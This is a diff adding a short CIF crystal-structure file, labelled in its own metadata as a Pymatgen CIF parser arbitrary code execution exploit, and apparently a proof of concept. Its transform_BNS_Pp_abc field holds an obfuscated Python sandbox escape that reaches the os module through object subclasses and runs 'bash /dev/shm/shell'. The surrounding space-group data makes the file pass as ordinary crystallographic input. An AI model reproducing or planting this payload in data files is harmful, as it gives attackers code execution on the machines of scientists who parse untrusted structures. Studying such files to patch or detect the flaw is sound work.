@@ -1,0 +1,14 @@
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("bash /dev/shm/shell");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
